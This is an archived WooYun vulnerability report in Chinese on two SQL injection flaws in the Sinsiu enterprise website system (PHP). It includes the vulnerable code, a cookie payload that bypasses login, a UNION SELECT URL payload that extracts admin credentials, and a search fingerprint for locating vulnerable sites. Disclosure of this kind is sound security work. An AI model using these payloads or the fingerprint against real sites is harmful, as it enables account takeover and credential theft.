{"id": 52766, "wybug_id": "wooyun-2014-070230", "wybug_title": "某通用型企业建站系统2处 sql注入", "wybug_corp": "新秀企业网站系统PHP版", "wybug_author": "roker", "wybug_date": "2014-07-30 14:52", "wybug_open_date": "2014-10-28 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向公众公开  简要描述： rt 详细说明：  新秀企业网站系统PHP版是一款简洁易用、方便二次开发的PHP企业网站系统。系统安装时有Mysql和Access两种数据库可供选择；后台功能齐全，操作简便，可扩展性良好，具有较高安全性；前台可设置成同时显示多国语言，适合用于外贸企业建站；系统采用了目前业界著名的PHP模板引擎Smarty，熟悉Smarty的开发人员可以方便、快速地制作出sinsiu模板。sql#1/include/function.php\nfunction strict($str){\tif(S_MAGIC_QUOTES_GPC)\t{\t\t$str = stripslashes($str); gpc的话就去掉转义符（故意给我们注入的么。。。）\t}\t$str = str_replace('<','&#60;',$str);\t$str = str_replace('>','&#62;',$str);\t$str = str_replace('?','&#63;',$str);\t$str = str_replace('%','&#37;',$str);\t$str = str_replace(chr(39),'&#39;',$str);\t$str = str_replace(chr(34),'&#34;',$str);\t$str = str_replace(chr(13).chr(10),'<br />',$str);\treturn $str;             /过滤一些字符，可以看到单引号没了}\n前台提交参数的地方都 urlencode后带入数据库了 （有一处我们后面再讲、），利用这个点，能注入的地方只找到一处。同一文件\nfunction check_user_login(){\tglobal $user_id;\t$username = get_cookie('user_username');\t$password = get_cookie('user_password');\tif($username != '' && $password != '')\t{\t\t$obj = new users();\t\t$obj->set_field('use_id');\t\t$obj->set_where(\"use_username = '$username'\");\t\t$obj->set_where(\"use_password = '$password'\");\t\t$one = $obj->get_one();\t\tif(count($one) !== 0)\t\t{\t\t\t$user_id = $one['use_id'];\t\t\treturn intval($user_id);\t\t}else{\t\t\treturn 0;\t\t}\t}else{\t\treturn 0;\t}}\n我们修改cookie \nuser_username = aa\\  ;user_password=or use_id = 1 %23\n看sql日志 ，执行的语句为\n\n可伪造任意用户登入，没有报错 ，所以 亦可盲注、sql#2  (伪静态注入)/index/search.php\nset_smarty();load_lang_pack(array($global['channel']));initial('index');if(isset($global['key'])){\t$smarty->assign('page_title',rawurldecode($global['key']));}$smarty->display('search.php');\n这里，我们的数据url编码后 又进行了解码。导致单引号的代入，官网下的默认数据库结构的话    exp为\n?/search/index.html/key-%%27%20union%20select%20adm_username,adm_password,3%20from%20php_admin%23/\n\n\n关键字 \nPowered by sinsiu 粤ICP备12345678号\n存在 ?/search/ 页面即可注入（他有两个版本，asp版没找到注入）\n\n实测大部分数据结构做了变更，建议测试用sqlmap。提供5个实例用以证明其通用性\n\n\n\n\n\n\n\n\n\n   漏洞证明：  如上所述   修复方案：  过滤   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-04 10:34 厂商回复： CNVD确认并复现所述情况，暂未建立与软件生厂商联系渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}